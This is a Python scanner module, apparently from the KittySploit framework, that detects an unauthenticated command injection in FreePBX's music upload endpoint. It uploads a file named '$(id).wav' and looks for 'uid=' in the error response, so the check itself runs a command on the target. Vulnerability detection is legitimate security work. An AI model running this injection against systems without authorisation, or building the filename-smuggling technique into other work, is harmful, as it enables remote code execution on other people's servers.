#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FreePBX music module filename command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreePBX - Music Upload Filename RCE Detection',
        'description': (
            'Detects FreePBX music module RCE by uploading a file named $(id).wav via '
            '/admin/ajax.php?module=music&command=upload and matching uid= in the 500 response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'freepbx', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/freepbx_music_upload_rce'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/40345/',
        ],
    }

    def run(self):
        name = self.random_text(10)
        bound = '----------' + name
        body = (
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="extension"\r\n\r\n'
            '0\r\n'
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="language"\r\n\r\n'
            'en\r\n'
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="filename"\r\n\r\n'
            f'{name}.wav\r\n'
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="codec[1]"\r\n\r\n'
            'gsm\r\n'
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="id"\r\n\r\n'
            '1\r\n'
            f'--{bound}\r\n'
            'Content-Disposition: form-data; name="files[1]"; filename="$(id).wav"\r\n'
            'Content-Type: text/plain\r\n\r\n'
            f'{name} test\r\n'
            f'--{bound}--\r\n'
        )
        r = self.http_request(
            method='POST',
            path='/admin/ajax.php?module=music&command=upload',
            data=body,
            headers={'Content-Type': f'multipart/form-data; boundary={bound}'},
            allow_redirects=False,
        )
        if not r:
            return False
        if r.status_code == 500 and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='FreePBX music upload filename RCE',
                path='/admin/ajax.php?module=music&command=upload',
            )
            return True
        return False
